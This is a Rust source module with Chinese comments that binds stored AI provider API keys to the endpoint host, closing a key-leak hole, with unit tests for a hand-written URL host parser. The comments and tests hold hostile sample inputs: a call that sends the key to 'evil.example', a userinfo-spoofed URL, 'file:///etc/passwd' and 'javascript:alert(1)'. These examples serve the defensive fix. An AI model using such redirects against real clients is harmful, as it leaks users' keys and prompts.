//! AI provider API key 的**端點綁定**（ADR-0235 H3）。
//!
//! ## 修正前的缺口
//!
//! `ai_generate` 舊版的取金鑰邏輯是 `api_key(provider)`——只要 `provider == "openai"`，
//! 就對**呼叫端指定的任何 endpoint** 無條件 `.bearer_auth(key)`。而 `check_endpoint` 只驗
//! scheme 是 http/https，**不驗主機**。於是：
//!
//! ```text
//! ai_generate("openai", "https://evil.example", model, prompt)
//! ```
//!
//! 會把使用者的 API key 當 Bearer token、連同訊息明文一起送給攻擊者指定的主機。
//! 前端 `ollama.ts` 雖有 `ensureAllowed` 的 localhost 硬守則，但那是 **JS 層**——
//! webview 一旦被 XSS 就整個繞過（而桌面端在 ADR-0235 C4 之前連 CSP 都沒有）。
//!
//! ## 現在的行為
//!
//! key 以 `ai:<provider>:<host>` 存放，查詢時用**當次 endpoint 的主機**組 account。
//! 端點被換掉＝查不到 key ＝金鑰**根本不會從金鑰庫被讀出來**。使用者換 provider 主機
//! （OpenAI → OpenRouter）時需重新輸入 key——那本來就是不同的 key，是正確的 UX。
//!
//! 住在 lib 而非 `main.rs`：bin target 需要 `tauri-app` feature，CI 的 `cargo test` 永遠
//! 編不到它——安全關鍵的東西不能沒測試（同 `partfile` 的理由，ADR-0119）。

/// 從端點 URL 取主機（小寫）。**只接受 http/https**；其餘 scheme 或無法解析回 `None`。
///
/// 刻意手寫最小解析而不引入 URL 函式庫：這裡只需要 `scheme://[userinfo@]host[:port]/...`
/// 的 host 欄位，且必須在**不開 `tauri-app` feature**（＝沒有 `reqwest`）時也能編譯與測試。
pub fn endpoint_host(endpoint: &str) -> Option<String> {
    let rest = endpoint
        .strip_prefix("https://")
        .or_else(|| endpoint.strip_prefix("http://"))?;
    // 權威部分＝到第一個 `/`、`?` 或 `#` 為止。
    let authority = rest.split(['/', '?', '#']).next()?;
    // userinfo（`user:pass@host`）：取 **最後一個** `@` 之後——`https://evil.com@real.com`
    // 的真實主機是 `real.com`，取第一個 `@` 會判斷成 `evil.com` 而放行。
    let hostport = match authority.rsplit_once('@') {
        Some((_, h)) => h,
        None => authority,
    };
    // IPv6 字面值 `[::1]:8080`：先切掉方括號內容再找 port。
    let host = if let Some(end) = hostport.find(']') {
        &hostport[..=end]
    } else {
        hostport.split(':').next()?
    };
    if host.is_empty() {
        return None;
    }
    Some(host.to_ascii_lowercase())
}

/// 金鑰庫 account：**含主機**。同一 provider 的不同主機＝不同 account。
pub fn key_account(provider: &str, host: &str) -> String {
    format!("ai:{provider}:{host}")
}

/// provider 的官方主機——僅供舊版無主機金鑰（`ai:<provider>`）一次性沿用。
/// 只有端點正是官方主機時才沿用，否則舊 key 又會被送到任意主機，等於沒修。
pub fn provider_default_host(provider: &str) -> Option<&'static str> {
    match provider {
        "openai" => Some("api.openai.com"),
        _ => None,
    }
}

/// 是否可沿用舊版無主機金鑰。
pub fn legacy_key_allowed(provider: &str, host: &str) -> bool {
    provider_default_host(provider) == Some(host)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn 取主機_小寫化並忽略路徑與_port() {
        assert_eq!(endpoint_host("https://API.OpenAI.com/v1"), Some("api.openai.com".into()));
        assert_eq!(endpoint_host("http://localhost:11434"), Some("localhost".into()));
        assert_eq!(endpoint_host("https://example.com:443/a/b?c=d#e"), Some("example.com".into()));
        assert_eq!(endpoint_host("https://example.com"), Some("example.com".into()));
    }

    #[test]
    fn 只接受_http_https() {
        // 擋掉把 prompt 導去別處的非 HTTP 目標。
        assert_eq!(endpoint_host("file:///etc/passwd"), None);
        assert_eq!(endpoint_host("ftp://example.com"), None);
        assert_eq!(endpoint_host("javascript:alert(1)"), None);
        assert_eq!(endpoint_host("not a url"), None);
        assert_eq!(endpoint_host(""), None);
        assert_eq!(endpoint_host("https://"), None);
    }

    #[test]
    fn userinfo_取最後一個_at_之後才是真主機() {
        // 🔴 經典騙術：`https://api.openai.com@evil.example/` 的真實主機是 evil.example。
        assert_eq!(
            endpoint_host("https://api.openai.com@evil.example/v1"),
            Some("evil.example".into())
        );
        assert_eq!(
            endpoint_host("https://a@b@real.example/x"),
            Some("real.example".into())
        );
    }

    #[test]
    fn ipv6_字面值保留方括號() {
        assert_eq!(endpoint_host("http://[::1]:11434/api"), Some("[::1]".into()));
        assert_eq!(endpoint_host("http://[::1]"), Some("[::1]".into()));
    }

    #[test]
    fn 不同主機得到不同_account() {
        assert_eq!(key_account("openai", "api.openai.com"), "ai:openai:api.openai.com");
        assert_ne!(
            key_account("openai", "api.openai.com"),
            key_account("openai", "evil.example")
        );
    }

    #[test]
    fn legacy_金鑰只在官方主機沿用() {
        assert!(legacy_key_allowed("openai", "api.openai.com"));
        assert!(!legacy_key_allowed("openai", "evil.example"));
        // ollama 是本機、從不帶 key → 無官方主機可沿用。
        assert!(!legacy_key_allowed("ollama", "localhost"));
    }
}
